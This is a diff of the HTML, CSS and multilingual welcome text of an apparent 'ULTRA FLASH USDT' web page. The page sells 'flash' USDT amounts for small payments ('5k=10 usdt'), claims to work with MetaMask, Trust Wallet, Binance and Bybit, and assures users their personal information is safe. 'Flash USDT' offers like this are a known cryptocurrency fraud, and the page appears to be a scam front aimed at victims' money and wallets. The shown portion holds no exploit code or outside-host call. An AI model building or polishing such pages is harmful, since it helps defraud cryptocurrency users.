@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
   <title>ULTRA FLASH USDT</title>
   <style>
     body {
@@ -15,35 +14,31 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      overflow: hidden;
     }
 
     .chat-popup, .container {
       background: rgba(0, 0, 0, 0.75);
       backdrop-filter: blur(10px);
       border-radius: 16px;
-      box-shadow: 0 0 15px rgba(0,204,255,0.6);
-      text-align: left;
-      font-size: 14px;
-      line-height: 1.6;
-      white-space: pre-line;
-      max-width: 280px;
-      width: 100%;
-      padding: 2cm 1cm;
-      box-sizing: border-box;
+      padding: 25px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.6);
       display: none;
+      text-align: left;
     }
 
     .chat-popup.active {
       display: block;
     }
 
+    .container {
+      display: none;
+    }
+
     h1 {
       text-align: center;
       color: #00ccff;
-      margin-top: 0;
-      margin-bottom: 1rem;
-      font-size: 1.6rem;
     }
 
     .form-group {
@@ -53,7 +48,6 @@
     label {
       display: block;
       margin-bottom: 6px;
-      font-weight: 600;
     }
 
     select, textarea, button {
@@ -62,9 +56,11 @@
       border-radius: 8px;
       border: none;
       font-size: 16px;
+    }
+
+    select, textarea {
       background-color: #1a1a1a;
       color: white;
-      box-sizing: border-box;
     }
 
     textarea {
@@ -77,7 +73,6 @@
       color: black;
       font-weight: bold;
       cursor: pointer;
-      margin-top: 10px;
     }
 
     #progressBar {
@@ -95,6 +90,10 @@
       background-color: #00ccff;
     }
 
+    #popup, .lang-switcher {
+      display: none;
+    }
+
     #popup {
       position: fixed;
       background-color: #111;
@@ -102,13 +101,9 @@
       border-radius: 12px;
       box-shadow: 0 0 10px #00ccff;
       z-index: 10;
-      width: 280px;
+      width: 300px;
       max-width: 90%;
       text-align: center;
-      display: none;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
     }
 
     #popup button, #startBtn {
@@ -118,25 +113,12 @@
       border: none;
       border-radius: 6px;
       cursor: pointer;
-      color: black;
-      font-weight: bold;
     }
 
     .lang-switcher {
       position: absolute;
       top: 15px;
       right: 15px;
-      z-index: 15;
-    }
-
-    .lang-switcher select {
-      background-color: #1a1a1a;
-      color: white;
-      border: none;
-      padding: 5px 10px;
-      border-radius: 6px;
-      font-weight: bold;
-      cursor: pointer;
     }
   </style>
 </head>
@@ -152,7 +134,9 @@
 </div>
 
 <div id="chatBox" class="chat-popup active">
-  <div id="welcomeText"></div>
+  <div id="welcomeText">
+    <!-- Filled by JS -->
+  </div>
   <button id="startBtn">Continue</button>
 </div>
 
@@ -162,9 +146,9 @@
   <div class="form-group">
     <label id="lblAmount" for="amount">Amount</label>
     <select id="amount">
-      <option value="1">1</option>
-      <option value="2">2</option>
-      <option value="3">3</option>
+      <option value="1">1k=Free</option>
+      <option value="2">5k=10 usdt</option>
+      <option value="3">20k=25 usdt</option>
     </select>
   </div>
 
@@ -193,42 +177,10 @@
 
 <script>
   const messages = {
-    en: `Dear user,
-
-1. This flash is for wallets and trading platforms (Metamask, Trustwallet, Binance, Bybit...).
-
-2. Wallet must have at least 0.0001 BNB.
-
-3. Our system keeps your personal information safe.
-
-4. Enjoy.`,
-    fr: `Cher utilisateur,
-
-1. Ce flash est pour les portefeuilles et plateformes de trading (Metamask, Trustwallet, Binance, Bybit...).
-
-2. Le portefeuille doit contenir au moins 0.0001 BNB.
-
-3. Notre système protège vos informations personnelles.
-
-4. Profitez.`,
-    zh: `亲爱的用户：
-
-1. 本程序适用于钱包和交易平台（Metamask、Trustwallet、Binance、Bybit...）。
-
-2. 钱包需至少包含 0.0001 BNB。
-
-3. 我们系统会保护您的个人信息。
-
-4. 祝您使用愉快。`,
-    ru: `Уважаемый пользователь,
-
-1. Этот флеш подходит для кошельков и торговых платформ (Metamask, Trustwallet, Binance, Bybit...).
-
-2. На кошельке должно быть не менее 0.0001 BNB.
-
-3. Наша система сохраняет вашу личную информацию в безопасности.
-
-4. Наслаждайтесь.`
+    en: `Dear user\n1. This flash is for wallets and trading platforms (metamask, trustwallet, binance, bybit...)\n2. Wallet must have at least 0.0001 BNB\n3. Our system keeps your personal information safe\n4. Enjoy`,
+    fr: `Cher utilisateur\n1. Ce flash est pour les portefeuilles et les plateformes de trading (metamask, trustwallet, binance, bybit...)\n2. Le portefeuille doit contenir au moins 0.0001 BNB\n3. Notre système protège vos informations personnelles\n4. Profitez`,
+    zh: `亲爱的用户\n1. 本程序适用于钱包和交易平台 (Metamask, TrustWallet, Binance, Bybit...)\n2. 钱包需至少包含 0.0001 BNB\n3. 我们的系统保障您的隐私\n4. 祝您使用愉快`,
+    ru: `Уважаемый пользователь\n1. Этот флеш для кошельков и платформ (metamask, trustwallet, binance, bybit...)\n2. На кошельке должно быть минимум 0.0001 BNB\n3. Мы храним ваши данные в безопасности\n4. Наслаждайтесь`
   };
 
   const labels = {
